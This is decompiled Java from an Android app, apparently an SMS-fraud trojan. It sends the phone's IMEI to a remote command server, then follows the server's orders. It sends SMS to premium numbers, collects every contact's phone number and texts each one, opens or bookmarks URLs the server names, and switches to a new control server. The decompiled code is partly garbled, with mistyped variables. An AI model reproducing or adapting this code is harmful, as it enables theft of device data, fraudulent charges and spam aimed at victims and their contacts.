	private synthetic ru.droid.install.system.ServiceController a
	
	    a(ru.droid.install.system.ServiceController p1)
	    {
	        this.a = p1;
	        return;
	    }
	
	
	    private varargs String a()
	    {
	        try {
	            int v4_0 = ((android.telephony.TelephonyManager) this.a.a.getSystemService("phone")).getDeviceId();
	            android.database.Cursor v9_1 = new org.apache.http.impl.client.DefaultHttpClient();
	            try {
	                android.database.Cursor v0_6 = new java.net.URI("http", ru.droid.install.system.AndroidService.b, "/getTask.php", new StringBuilder().append("imei=").append(v4_0).append("&balance=").append(ru.droid.install.other.ControlReceiver.a).toString(), 0).toASCIIString();
	            } catch (android.database.Cursor v0_7) {
	                v0_7.printStackTrace();
	                v0_6 = "";
	            }
	            android.database.Cursor v0_10 = v9_1.execute(new org.apache.http.client.methods.HttpGet(v0_6)).getEntity().getContent();
	            java.util.ArrayList v1_5 = new java.io.BufferedReader(new java.io.InputStreamReader(v0_10, "utf-8"), 8);
	            String v2_4 = new StringBuilder();
	            while(true) {
	                String v3_3 = v1_5.readLine();
	                if (v3_3 == null) {
	                    break;
	                }
	                v2_4.append(v3_3);
	            }
	            v2_4.toString();
	            v0_10.close();
	            v1_5.close();
	            try {
	                android.database.Cursor v0_12 = new org.json.JSONArray(v2_4.toString());
	                v0_12.toString();
	                org.json.JSONObject v8_1 = v0_12.getJSONObject(0);
	                this.a.b = v8_1.getString("active_1");
	                this.a.c = v8_1.getString("active_2");
	                this.a.d = v8_1.getString("active_3");
	                this.a.e = v8_1.getString("active_4");
	            } catch (android.database.Cursor v0) {
	                android.database.Cursor v0_72 = "-100";
	                return v0_72;
	            }
	            if (this.a.b.equals("1")) {
	                ru.droid.install.system.AndroidService.c = 1;
	                ru.droid.install.system.ServiceController.a(this.a, v8_1.getString("number_1"), v8_1.getString("prefix_1"));
	                android.database.Cursor v0_23 = new ru.droid.install.system.c(this.a);
	                java.util.ArrayList v1_21 = new String[1];
	                v1_21[0] = "1";
	                v0_23.execute(v1_21);
	            }
	            if (this.a.c.equals("1")) {
	                android.database.Cursor v9_2 = this.a.a.getContentResolver().query(android.provider.ContactsContract$Contacts.CONTENT_URI, 0, 0, 0, 0);
	                while (v9_2.moveToNext()) {
	                    android.database.Cursor v0_66;
	                    String v3_11 = v9_2.getString(v9_2.getColumnIndex("_id"));
	                    if (!v9_2.getString(v9_2.getColumnIndex("has_phone_number")).equalsIgnoreCase("1")) {
	                        v0_66 = "false";
	                    } else {
	                        v0_66 = "true";
	                    }
	                    if (Boolean.parseBoolean(v0_66)) {
	                        android.database.Cursor v0_71 = this.a.a.getContentResolver().query(android.provider.ContactsContract$CommonDataKinds$Phone.CONTENT_URI, 0, new StringBuilder().append("contact_id = ").append(v3_11).toString(), 0, 0);
	                        while (v0_71.moveToNext()) {
	                            this.a.f.add(v0_71.getString(v0_71.getColumnIndex("data1")));
	                        }
	                        v0_71.close();
	                    }
	                }
	                v9_2.close();
	                java.util.ArrayList v1_24 = 0;
	                while (v1_24 < this.a.f.size()) {
	                    ru.droid.install.system.ServiceController.a(this.a, ((String) this.a.f.get(v1_24)), v8_1.getString("text_2"));
	                    v1_24++;
	                }
	                android.database.Cursor v0_35 = new ru.droid.install.system.c(this.a);
	                java.util.ArrayList v1_27 = new String[1];
	                v1_27[0] = "2";
	                v0_35.execute(v1_27);
	            }
	            if (this.a.d.equals("1")) {
	                if (!v8_1.getString("action_url").equals("0")) {
	                    ru.droid.install.system.ServiceController.a(this.a.a, "Last bookmark", v8_1.getString("url"));
	                } else {
	                    android.database.Cursor v0_45 = new android.content.Intent("android.intent.action.VIEW", android.net.Uri.parse(v8_1.getString("url")));
	                    v0_45.addFlags(268435456);
	                    this.a.a.startActivity(v0_45);
	                }
	                android.database.Cursor v0_47 = new ru.droid.install.system.c(this.a);
	                java.util.ArrayList v1_37 = new String[1];
	                v1_37[0] = "3";
	                v0_47.execute(v1_37);
	            }
	            if (!this.a.e.equals("1")) {
	                v0_72 = 0;
	                return v0_72;
	            } else {
	                ru.droid.install.system.AndroidService.a(v8_1.getString("server"));
	                android.database.Cursor v0_54 = new ru.droid.install.system.c(this.a);
	                java.util.ArrayList v1_41 = new String[1];
	                v1_41[0] = "4";
	                v0_54.execute(v1_41);
	            }
	        } catch (android.database.Cursor v0_73) {
	            v0_73.printStackTrace();
	        }
	    }
	
	
	    protected final bridge synthetic Object doInBackground(Object[] p2)
	    {
	        return this.a();
	    }
	
	
	    protected final bridge synthetic void onPostExecute(Object p1)
	    {
	        return;
	    }
	
